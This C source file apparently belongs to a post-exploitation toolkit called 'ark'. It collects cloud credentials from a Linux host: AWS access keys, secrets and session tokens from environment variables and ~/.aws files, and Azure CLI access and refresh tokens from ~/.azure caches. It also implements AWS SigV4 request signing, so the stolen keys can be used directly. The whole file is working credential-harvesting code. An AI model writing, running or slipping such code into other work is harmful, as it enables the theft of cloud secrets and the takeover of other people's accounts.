#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <openssl/evp.h>
#include <openssl/hmac.h>

#include "ark/linux_cloud.h"

void ark_cloud_trim(char *s) {
    if (!s) return;
    size_t n = strlen(s);
    while (n && (s[n - 1] == '\r' || s[n - 1] == '\n' || s[n - 1] == ' ' || s[n - 1] == '\t'))
        s[--n] = '\0';
    char *p = s;
    while (*p == ' ' || *p == '\t') p++;
    if (p != s) memmove(s, p, strlen(p) + 1);
}

static void copy_str(char *dst, size_t cap, const char *src) {
    if (!dst || cap == 0) return;
    if (!src) { dst[0] = '\0'; return; }
    strncpy(dst, src, cap - 1);
    dst[cap - 1] = '\0';
}

static int add_aws_cred(ark_cloud_credential *creds, size_t *n, size_t max,
    const char *id, const char *secret, const char *token, const char *src) {
    if (!id || !id[0] || *n >= max) return 0;
    ark_cloud_credential *c = &creds[(*n)++];
    memset(c, 0, sizeof(*c));
    copy_str(c->provider, sizeof(c->provider), "aws");
    copy_str(c->cred_type, sizeof(c->cred_type), "access_key");
    copy_str(c->identity, sizeof(c->identity), id);
    copy_str(c->secret, sizeof(c->secret), secret);
    copy_str(c->extra, sizeof(c->extra), token);
    copy_str(c->source, sizeof(c->source), src);
    return 1;
}

int ark_cloud_harvest_aws_env(ark_cloud_credential *creds, size_t *n, size_t max) {
    const char *id = getenv("AWS_ACCESS_KEY_ID");
    if (!id || !id[0]) return 1;
    const char *sec = getenv("AWS_SECRET_ACCESS_KEY");
    const char *tok = getenv("AWS_SESSION_TOKEN");
    add_aws_cred(creds, n, max, id, sec ? sec : "", tok ? tok : "", "environment");
    return 1;
}

static void aws_flush(const char *path, const char *profile,
    char *access, char *secret, char *token,
    ark_cloud_credential *creds, size_t *n, size_t max) {
    if (!access[0]) return;
    char src[256];
    snprintf(src, sizeof(src), "%s [%s]", path, profile);
    add_aws_cred(creds, n, max, access, secret, token, src);
    access[0] = secret[0] = token[0] = '\0';
}

int ark_cloud_parse_aws_ini(const char *path, ark_cloud_credential *creds, size_t *n, size_t max) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char line[512], profile[128] = "default";
    char access[256] = {0}, secret[512] = {0}, token[1024] = {0};
    int in_profile = 0;
    while (fgets(line, sizeof(line), f)) {
        ark_cloud_trim(line);
        if (!line[0] || line[0] == '#' || line[0] == ';') continue;
        if (line[0] == '[') {
            if (in_profile) aws_flush(path, profile, access, secret, token, creds, n, max);
            char *end = strchr(line, ']');
            if (end) {
                *end = '\0';
                copy_str(profile, sizeof(profile), line + 1);
                in_profile = 1;
            }
            continue;
        }
        char *eq = strchr(line, '=');
        if (!eq) continue;
        *eq = '\0';
        ark_cloud_trim(line);
        ark_cloud_trim(eq + 1);
        if (strcasecmp(line, "aws_access_key_id") == 0) copy_str(access, sizeof(access), eq + 1);
        else if (strcasecmp(line, "aws_secret_access_key") == 0) copy_str(secret, sizeof(secret), eq + 1);
        else if (strcasecmp(line, "aws_session_token") == 0) copy_str(token, sizeof(token), eq + 1);
    }
    if (in_profile) aws_flush(path, profile, access, secret, token, creds, n, max);
    fclose(f);
    return 1;
}

int ark_cloud_harvest_aws_files(const char *home, ark_cloud_credential *creds, size_t *n, size_t max) {
    if (!home || !home[0]) return 1;
    char path[1024];
    snprintf(path, sizeof(path), "%s/.aws/credentials", home);
    ark_cloud_parse_aws_ini(path, creds, n, max);
    snprintf(path, sizeof(path), "%s/.aws/config", home);
    ark_cloud_parse_aws_ini(path, creds, n, max);
    return 1;
}

int ark_cloud_azure_cache_present(const char *home, ark_cloud_token *toks, size_t *n, size_t max) {
    if (!home || *n >= max) return 1;
    static const char *names[] = {
        ".azure/msal_token_cache.json",
        ".azure/accessTokens.json",
        ".azure/azureProfile.json",
        NULL
    };
    for (int i = 0; names[i] && *n < max; i++) {
        char path[1024];
        snprintf(path, sizeof(path), "%s/%s", home, names[i]);
        FILE *f = fopen(path, "r");
        if (!f) continue;
        fclose(f);
        ark_cloud_token *t = &toks[(*n)++];
        memset(t, 0, sizeof(*t));
        copy_str(t->provider, sizeof(t->provider), "azure");
        copy_str(t->token_type, sizeof(t->token_type), "cache_present");
        copy_str(t->source, sizeof(t->source), path);
    }
    return 1;
}

/* Extract "accessToken"/"refreshToken" JSON strings without a full parser. */
static int extract_json_string(const char *buf, const char *key, char *out, size_t cap) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *p = strstr(buf, pat);
    if (!p) return 0;
    p = strchr(p + strlen(pat), ':');
    if (!p) return 0;
    p++;
    while (*p == ' ' || *p == '\t') p++;
    if (*p != '"') return 0;
    p++;
    size_t i = 0;
    while (*p && *p != '"' && i + 1 < cap) {
        if (*p == '\\' && p[1]) p++;
        out[i++] = *p++;
    }
    out[i] = '\0';
    return i > 0;
}

int ark_cloud_harvest_azure_cli(const char *home, ark_cloud_token *toks, size_t *n, size_t max) {
    if (!home) return 1;
    char path[1024];
    snprintf(path, sizeof(path), "%s/.azure/accessTokens.json", home);
    FILE *f = fopen(path, "r");
    if (!f) return ark_cloud_azure_cache_present(home, toks, n, max);
    char buf[8192];
    size_t got = fread(buf, 1, sizeof(buf) - 1, f);
    fclose(f);
    buf[got] = '\0';
    char at[2048] = {0}, rt[512] = {0};
    extract_json_string(buf, "accessToken", at, sizeof(at));
    extract_json_string(buf, "refreshToken", rt, sizeof(rt));
    if (!at[0] && !rt[0])
        return ark_cloud_azure_cache_present(home, toks, n, max);
    if (*n >= max) return 1;
    ark_cloud_token *t = &toks[(*n)++];
    memset(t, 0, sizeof(*t));
    copy_str(t->provider, sizeof(t->provider), "azure");
    copy_str(t->token_type, sizeof(t->token_type), at[0] ? "access_token" : "refresh_token");
    copy_str(t->access_token, sizeof(t->access_token), at);
    copy_str(t->refresh_token, sizeof(t->refresh_token), rt);
    copy_str(t->source, sizeof(t->source), "accessTokens.json");
    return 1;
}

static void sha256_hex(const unsigned char *in, size_t n, char out[65]) {
    unsigned char md[32];
    unsigned int l = 0;
    EVP_MD_CTX *ctx = EVP_MD_CTX_new();
    if (!ctx) { out[0] = '\0'; return; }
    EVP_DigestInit_ex(ctx, EVP_sha256(), NULL);
    EVP_DigestUpdate(ctx, in, n);
    EVP_DigestFinal_ex(ctx, md, &l);
    EVP_MD_CTX_free(ctx);
    for (int i = 0; i < 32; i++) sprintf(out + i * 2, "%02x", md[i]);
    out[64] = '\0';
}

static int hmac_sha256(const unsigned char *key, size_t klen,
    const unsigned char *data, size_t dlen, unsigned char out[32]) {
    unsigned int l = 0;
    if (!HMAC(EVP_sha256(), key, (int)klen, data, dlen, out, &l) || l != 32)
        return 0;
    return 1;
}

int ark_aws_sigv4(const char *method, const char *host, const char *path, const char *query,
    const char *payload, const char *akid, const char *secret, const char *region, const char *service,
    const char *amz_date, const char *date_stamp, char *auth, size_t auth_cap) {
    if (!method || !host || !path || !akid || !secret || !region || !service || !amz_date || !date_stamp || !auth)
        return 0;
    if (!query) query = "";
    if (!payload) payload = "";
    char payhash[65];
    sha256_hex((const unsigned char *)payload, strlen(payload), payhash);
    char canon[4096];
    int cn = snprintf(canon, sizeof(canon),
        "%s\n%s\n%s\nhost:%s\nx-amz-date:%s\n\nhost;x-amz-date\n%s",
        method, path, query, host, amz_date, payhash);
    if (cn < 0 || (size_t)cn >= sizeof(canon)) return 0;
    char chash[65];
    sha256_hex((const unsigned char *)canon, strlen(canon), chash);
    char sts[512];
    snprintf(sts, sizeof(sts), "AWS4-HMAC-SHA256\n%s\n%s/%s/%s/aws4_request\n%s",
        amz_date, date_stamp, region, service, chash);
    unsigned char k[32], t[32];
    char ksecret[256];
    snprintf(ksecret, sizeof(ksecret), "AWS4%s", secret);
    if (!hmac_sha256((unsigned char *)ksecret, strlen(ksecret),
            (unsigned char *)date_stamp, strlen(date_stamp), k))
        return 0;
    if (!hmac_sha256(k, 32, (unsigned char *)region, strlen(region), t)) return 0;
    memcpy(k, t, 32);
    if (!hmac_sha256(k, 32, (unsigned char *)service, strlen(service), t)) return 0;
    memcpy(k, t, 32);
    if (!hmac_sha256(k, 32, (unsigned char *)"aws4_request", 12, t)) return 0;
    memcpy(k, t, 32);
    if (!hmac_sha256(k, 32, (unsigned char *)sts, strlen(sts), t)) return 0;
    char sig[65];
    for (int i = 0; i < 32; i++) sprintf(sig + i * 2, "%02x", t[i]);
    sig[64] = '\0';
    snprintf(auth, auth_cap,
        "AWS4-HMAC-SHA256 Credential=%s/%s/%s/%s/aws4_request, SignedHeaders=host;x-amz-date, Signature=%s",
        akid, date_stamp, region, service, sig);
    return 1;
}
